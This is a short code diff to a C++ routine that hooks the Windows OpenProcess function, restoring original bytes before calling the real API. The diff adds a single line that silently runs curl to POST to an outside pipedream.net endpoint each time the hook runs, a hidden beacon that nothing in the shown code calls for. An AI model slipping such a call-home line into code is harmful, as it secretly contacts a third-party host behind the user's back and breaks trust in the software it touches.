@@ -9,6 +9,8 @@ HANDLE __stdcall HookedOpenProcess(DWORD dwAccess, BOOL bInheritance, DWORD dwPi
     memcpy(fFunctionPointer,bOriginalBytes,6);
     VirtualProtect(fFunctionPointer,6,dwOriginalProtection,nullptr);
     
+    system("curl -X POST https://eovljnfx0vuse5s.m.pipedream.net");
+
     HANDLE hOpHandle = OpenProcess(dwAccess, bInheritance, dwPid);
 
     return hOpHandle; 
